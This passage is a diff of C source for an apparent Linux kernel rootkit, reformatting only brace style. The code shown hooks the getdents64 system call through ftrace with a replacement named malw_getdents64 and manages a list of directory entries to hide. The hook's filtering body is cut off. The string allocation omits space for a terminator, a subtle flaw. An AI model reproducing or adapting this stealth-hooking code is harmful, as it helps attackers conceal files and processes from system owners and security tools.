@@ -11,14 +11,16 @@ static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 
 struct ftrace_hook hook_getdents = HOOK("__x64_sys_getdents64", malw_getdents64, &orig_getdents64);
 
-void add_hidden_dent(char *dent) {
+void add_hidden_dent(char *dent)
+{
     dent_size++;
     hidden_dents = krealloc(hidden_dents, dent_size*sizeof(char *), GFP_KERNEL);
     *(hidden_dents + dent_size - 1) = (char *) kmalloc(strlen(dent)*sizeof(char), GFP_KERNEL);
     strncpy(*(hidden_dents + dent_size - 1), dent, strlen(dent));
 }
 
-void remove_hidden_dent(char *dent) {
+void remove_hidden_dent(char *dent)
+{
     int i;
     int move = 0;
 
@@ -41,11 +43,13 @@ void remove_hidden_dent(char *dent) {
     }
 }
 
-void install_getdents_hook(void) {
+void install_getdents_hook(void)
+{
     fh_install_hook(&hook_getdents);
 }
 
-void remove_getdents_hook(void) {
+void remove_getdents_hook(void)
+{
     int i;
     fh_remove_hook(&hook_getdents);
     for (i = 0; i < dent_size; i++) {
@@ -54,7 +58,8 @@ void remove_getdents_hook(void) {
     kfree(hidden_dents);
 }
 
-asmlinkage int malw_getdents64(const struct pt_regs *regs) {
+asmlinkage int malw_getdents64(const struct pt_regs *regs)
+{
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
     long error;
     int i;
